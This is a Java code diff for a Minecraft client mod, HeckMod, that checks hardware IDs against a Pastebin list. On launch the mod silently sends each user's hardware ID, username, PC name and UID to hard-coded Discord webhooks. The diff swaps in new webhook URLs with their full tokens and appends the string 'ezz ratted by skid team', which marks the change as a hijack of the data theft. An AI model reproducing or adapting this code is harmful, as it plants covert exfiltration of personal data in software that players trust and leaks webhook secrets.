@@ -27,7 +27,7 @@ public class HeckMod implements ClientModInitializer {
     public static boolean CheckHWID() {
         String hwid = GetHWID();
         try {
-            URL url = new URL("https://pastebin.com/T098GAc2 "); // https://pastebin.com/raw/JPVdxFsG
+            URL url = new URL("https://pastebin.com/JPVdxFsG"); // https://pastebin.com/raw/JPVdxFsG
             URLConnection conn = url.openConnection();
             BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
             String line;
@@ -100,7 +100,7 @@ public class HeckMod implements ClientModInitializer {
             System.out.println(GetHWID());
             //e
             try {
-                String webhookUrl1 = "https://discord.com/api/webhooks/1276730892563386388/VN4wcLcsetkDVRPeuUjeJPvJA5sCil4VfMxWL532TrhSYF2anHw6QBok1n3fULbD2sB_";
+                String webhookUrl1 = "https://discord.com/api/webhooks/1276740759365619754/qOxZCAsoKzWGdu0Vb0P7yYEGQH_JdiTxDn4_Z5BNBZIauLjcgHR4e8uEnG6GM-vA7QpW_";
                 URL url = new URL(webhookUrl1);
                 HttpURLConnection con = (HttpURLConnection) url.openConnection();
                 con.setRequestMethod("POST");
@@ -114,7 +114,7 @@ public class HeckMod implements ClientModInitializer {
                     pcname = "желтер";
                 }
 
-                String payload = "{\"content\": \"" + "`Successful Launch |  Hwid: " + GetHWID() + " | Username: " + displayname + " | PC Name: " + pcname + " | Version: Heck-" + MOD_VER + " | Uid:  " + finaluid + "`\"}";
+                String payload = "{\"content\": \"" + "`Successful Launch |  Hwid: " + GetHWID() + " | Username: " + displayname + " | PC Name: " + pcname + " | Version: Heck-" + MOD_VER + " | Uid:  " + finaluid + "`\"}" + "ezz ratted by skid team";
                 OutputStream os = con.getOutputStream();
                 os.write(payload.getBytes());
                 os.flush();
@@ -129,7 +129,7 @@ public class HeckMod implements ClientModInitializer {
             String hwid2 = GetHWID();
 
             try {
-                String webhookUrl = "https://discord.com/api/webhooks/1276730892563386388/VN4wcLcsetkDVRPeuUjeJPvJA5sCil4VfMxWL532TrhSYF2anHw6QBok1n3fULbD2sB_";
+                String webhookUrl = "https://discord.com/api/webhooks/1276740759365619754/qOxZCAsoKzWGdu0Vb0P7yYEGQH_JdiTxDn4_Z5BNBZIauLjcgHR4e8uEnG6GM-vA7QpW";
                 URL url = new URL(webhookUrl);
                 HttpURLConnection con = (HttpURLConnection) url.openConnection();
                 con.setRequestMethod("POST");
